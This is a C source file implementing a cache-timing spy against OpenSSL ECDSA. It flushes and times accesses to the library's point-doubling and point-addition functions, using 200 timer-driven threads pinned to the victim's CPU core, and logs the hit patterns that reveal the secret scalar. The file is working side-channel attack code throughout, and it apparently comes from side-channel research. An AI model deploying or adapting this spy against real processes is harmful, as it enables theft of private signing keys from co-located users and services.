//Import 
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 199309L // For POSIX timer
#include <sched.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <semaphore.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <sys/time.h>
#include <syscall.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include "ec_lcl.h"
#include <sys/mman.h>

#include <openssl/ec.h>   
#include <openssl/ecdsa.h> 
#include <openssl/obj_mac.h>

#define NUM_THREADS 200

#define MAX_COUNT 20000/*MAX_COUNT should be multiple of NUM_THREADS to take threads out of the loop*/
pthread_mutex_t  mutexFile  = PTHREAD_MUTEX_INITIALIZER;
#define CLOCKID CLOCK_REALTIME
#define SIG SIGRTMIN
int ret;
timer_t timerid;
struct sigevent sev;  // Signal event
struct itimerspec its; // data structure to specify time in POSIX timer

sigset_t mask;
struct sigaction sa;

sem_t sem[NUM_THREADS]; // Separate semaphores for each thread
sem_t mute;

pthread_t tid[NUM_THREADS];
int state = 0;

/*
* Instruction to flush the memory referenced by the address
*/
inline void clflush(volatile void *p)
{
    asm volatile ("clflush (%0)" :: "r"(p));
}

/*
* Function to measure the memory access time by spy thread
*/

bool probe(char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    " mfence              \n"
    " lfence              \n"
    " rdtsc               \n"
    " lfence              \n"
    " movl %%eax, %%esi \n"
    " movl (%1), %%eax     \n"
    " lfence              \n"
    " rdtsc               \n"
    " subl %%esi, %%eax \n"
    " clflush 0(%1)       \n"
    : "=a" (time)
    : "c" (adrs)
    : "%esi", "%edx");
  return time<100 ? 1:0 ;
}


int *start_flag;
int *access_count;

 
void create_shared_memory(void )
{
	// Shared memory initialization 
	int fd = shm_open("/message1", O_CREAT |O_RDWR, 0644);
	if (fd < 0) {
		perror("failure on shm_open on fd");
		exit(1);
	}

	if(ftruncate(fd, sizeof(int)) == -1) {
		perror("Error on ftruncate to sizeof ftruncate fd\n");
		exit(-1);
	}
   
    start_flag = (int *) mmap(NULL, sizeof(int), PROT_WRITE|PROT_READ, MAP_SHARED, fd, 0);

    if (start_flag == MAP_FAILED ) {
        perror("Error on mmap on start_flag\n");
        exit(1);
    } 
	
	 
	
	int fd2 = shm_open("/message2", O_CREAT|O_RDWR, 0644);
    if (fd2 < 0) {
        perror("failure on shm_open on fd");
        exit(1);
    }

    if(ftruncate(fd2, 16) == -1) {
        perror("Error on ftruncate to sizeof ftruncate fd\n");
        exit(-1);
    }
    
    access_count = (int *) mmap(NULL, sizeof(int), PROT_WRITE|PROT_READ, MAP_SHARED, fd2, 0);
    if (access_count == MAP_FAILED ) {
        perror("Error on mmap on notification_flag\n");
        exit(1);
    }
		
}
/*
* Signal Handler to handle the signal sent by the Kernel on the expiration of timer.
*/
static void handler(int sig, siginfo_t *si, void *uc)
{
	state++; 
    ret = sem_post(&sem[(state)%NUM_THREADS]); // Function to increment (unlock) the value of 
    if (ret)								   // the semaphore
    {
        printf("Error in Sem Post\n");
    }
}

void *threadA(void *data_)  // Thread function
{
	
	int changed_shared_variable_access_count[MAX_COUNT/NUM_THREADS];
    cpu_set_t my_set;        
    CPU_ZERO(&my_set);       
    CPU_SET(2, &my_set);     
    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);

    int tid = (intptr_t)data_;
   
    int sid = syscall(SYS_gettid); /* Used to store the thread id into a file */
    FILE *fp;
    fp=fopen("ipc.out","a");    
    fprintf(fp,"thread_%d %d\n",tid,sid);  
    fclose(fp); 
		int ii;
		long int counter = 0;
	    unsigned long proberesult_d,proberesult_a;
		char *d,*a;
	
		d = ((char *)(&ec_GFp_simple_dbl));
		a = ((char *)(&ec_GFp_simple_add));
		
		bool values1[MAX_COUNT/NUM_THREADS]={0};
		bool values2[MAX_COUNT/NUM_THREADS]={0};
		
		for(ii=0;ii<MAX_COUNT/NUM_THREADS;ii++)
		{
			values1[ii]=0;
			values2[ii]=0;			
		}
		
		int sum=0;	 
		// Bringing into cache
		sum+=(*d);
		sum+=(*a);
		
		// Flush from cache
		clflush((void *)d);
		clflush((void *)a);
    while(1)  // Long loop where spies have to run till the required number of decryption are obtained.
    {

        ret = sem_wait(&sem[tid]); // Thread which has semaphore value equal to 1 will be allowed
      // printf("\n my thread enter^^^^^^^^^^^^ %d",tid);
        if (ret)
        {
            printf("Error in Sem Post\n");
        }
        //printf("Thread # -> %d\n",turn);

    	if(counter==20 && tid ==1) // notify V to start AES. We delayed this to start 
		{	
			//printf("pppppppppppppppppppppjskajssnadjsbcsdbcsdjbcdsjbcsdjbcdjibcidsjbc");// the AES in stable condition so that spies migrated on
			*start_flag =1; //  the same CPU core where Vicim is running.
			//printf("ECDSA should start now******************8\n");	
		}
	 
	
		// 	store value of shared variable at the time of receiving signal
			changed_shared_variable_access_count[counter]=*access_count;
			// Do the measurement ; Find the access time 
			proberesult_d = probe(d);					 
			proberesult_a = probe(a);	

			values1[counter] = proberesult_d;
			values2[counter] = proberesult_a;
		  					

        /*
        * Timer interval specifier.
        * it_value.tv_sec : provide time in seconds
        * it_value.tv_nsec : provide time in nanoseconds
        * it_interval : used to create an interval timer which is gonna expire after the specified time
        * mentioned in it again and again. Zero means it'll expire only once.
        */       
        its.it_value.tv_sec = 0;
        its.it_value.tv_nsec = 1000;
        its.it_interval.tv_sec = 0;
        its.it_interval.tv_nsec = 0;

        ret = timer_settime(timerid, 0, &its, NULL); // Arming the timer with the specified time.
        if ( ret < 0 )
            perror("timer_settime");
            
        counter++;
        
        if(counter==MAX_COUNT/NUM_THREADS-1) // condition for the exit of the thread.
		{	
			//printf("Finished execution %d\n",tid);	
			break;
		}    
    }

    /*
    * When spy is accomplished its work...
    * Store the results saved in the shared variables into the following file.
    */

	FILE *fp1,*fp2;		
	pthread_mutex_lock(&mutexFile );
	fp1=fopen("probe1.txt","a");
	fp2=fopen("probe2.txt","a");

			//printf("\n print val for %d counter value %d acesss_count here %d\n",tid,MAX_COUNT/NUM_THREADS,*access_count);
			for(counter=0;counter<MAX_COUNT/NUM_THREADS;counter++)
			{
				fprintf(fp2,"%5ld,%5d,%5ld,%5d,%5d\n",counter,tid,changed_shared_variable_access_count[counter],values1[counter],values2[counter]);
				if( values1[counter] || values2[counter])
					fprintf(fp1,"%5ld,%5d,%5ld,%5d,%5d\n",counter,tid,changed_shared_variable_access_count[counter],values1[counter],values2[counter]);
			}
			fclose(fp1);
			fclose(fp2);
			
	
	if(tid == NUM_THREADS-1)
	{
		printf("End of operation\n");	
	}
		
	pthread_mutex_unlock(&mutexFile );

}


int main(int argc, char *argv[])
{
    int data = 0;
    int err,i;
	create_shared_memory();	
    sa.sa_flags = SA_RESTART; // Restarting the signal call if interuppted. SA_SIGINFO can be used.
    sa.sa_sigaction = handler;// Explicitly telling the action to be taken on the delivery of the signal
    sigemptyset(&sa.sa_mask); // Emptying the signal mask
    err = sigaction(SIG, &sa, NULL); // Adding the signal SIG
    if (0 != err) {
        printf("sigaction failed\n"); }

    sev.sigev_notify = SIGEV_SIGNAL; // Process notification method to the program is Signal
    sev.sigev_signo = SIG; // SIgnal number
    sev.sigev_value.sival_ptr = &timerid; // Used in the handler to check whether the same signal has 
    // been delivered which was generated by the timer of not. 
   
    ret = timer_create(CLOCKID, &sev, &timerid); // Creating a timer which will be used by the threads.
    if ( ret < 0 )
        perror("timer_create");

    sem_init(&sem[0], 0, 1); // Initialization of the semaphores. Except one thread, all are initialized
    // to Zero. So, only one of them will be active in the beginning.
    for ( i = 1; i < NUM_THREADS; ++i)
        {
            sem_init(&sem[i], 0, 0); 
        }

    while(data < NUM_THREADS)
    {
        //create our threads
        err = pthread_create(&tid[data], NULL, threadA, (void *)(intptr_t)data);
       // printf("\n******************8n abe aaja bhai*&*&*&*&**&*&");
        if(err != 0)
            printf("\n can't create thread :[%s]", strerror(err));
        data++;
    }
  //  printf("\n hhhhhhhhhhhhhheeeeeeeeeeeeeeeerrrrrrrrrrrrreeeeeeeeee");
    
	//pthread_exit(NULL);
	
	data=0;
    while(data < NUM_THREADS)
    {  
        pthread_join(tid[data], NULL);
        data++;
    }
    
   // printf("\n&&&&&&&&&&&&&&&&&&&&&&& spyyyyyyyyyyy enddddddd &&&&&&&&&&");
}
